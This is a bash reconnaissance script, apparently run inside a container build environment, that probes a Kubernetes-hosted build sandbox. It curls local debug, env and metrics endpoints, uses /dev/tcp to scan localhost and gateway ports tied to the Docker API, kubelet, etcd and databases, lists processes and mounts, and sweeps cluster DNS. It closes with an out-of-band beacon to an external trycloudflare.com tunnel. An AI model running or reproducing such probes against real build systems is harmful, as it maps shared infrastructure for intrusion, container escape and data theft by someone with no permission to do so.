#!/bin/bash
echo "=== BUILD PROBE V2 START $(date -u) ==="

echo "=== LOCALHOST 8080 ROOT ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/ 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 METRICS ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/metrics 2>&1 | head -40 || echo "FAILED"

echo "=== LOCALHOST 8080 HEALTHZ ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/healthz 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 DEBUG ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/debug/pprof/ 2>&1 | head -30 || echo "FAILED"

echo "=== LOCALHOST 8080 VERSION ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/version 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 INFO ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/info 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 STATUS ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/status 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 API ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/api 2>&1 || echo "FAILED"

echo "=== LOCALHOST 8080 ENV ==="
curl -sv --connect-timeout 2 --max-time 4 http://127.0.0.1:8080/env 2>&1 || echo "FAILED"

echo "=== EXTENDED LOCALHOST SCAN ==="
for port in 2375 2376 4243 5000 8081 8443 9090 9100 9153 10250 10255 10256 6443 2379 2380 5984 3000 4194 15000 15001 9200 9300 11211 6379 3306 5432 53 25 8888 4040 4041 7070 7071; do
  (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "OPEN:$port" || true
done

echo "=== GATEWAY SCAN ==="
for port in 80 443 8080 8443 9090 10250 10255 2375 4243 5000 6443; do
  (echo >/dev/tcp/10.244.26.153/$port) 2>/dev/null && echo "GW_OPEN:$port" || true
done

echo "=== PROCESS LIST ==="
ps aux 2>&1 | head -20 || true

echo "=== MOUNT ==="
mount 2>&1 | head -20 || true

echo "=== DNS SRV RECORDS ==="
for svc in _https._tcp.kubernetes.default _http._tcp.kubernetes.default; do
  dig SRV ${svc}.svc.cluster.local @10.245.0.10 +short 2>&1 || true
done

echo "=== DNS PTR SCAN ==="
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20; do
  result=$(dig -x 10.245.0.${i} @10.245.0.10 +short 2>/dev/null)
  if [ -n "$result" ]; then
    echo "10.245.0.${i}: $result"
  fi
done

echo "=== OOB BUILD V2 ==="
curl -sv --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-v2-probe" 2>&1 || echo "OOB_FAILED"

echo "=== BUILD PROBE V2 END $(date -u) ==="
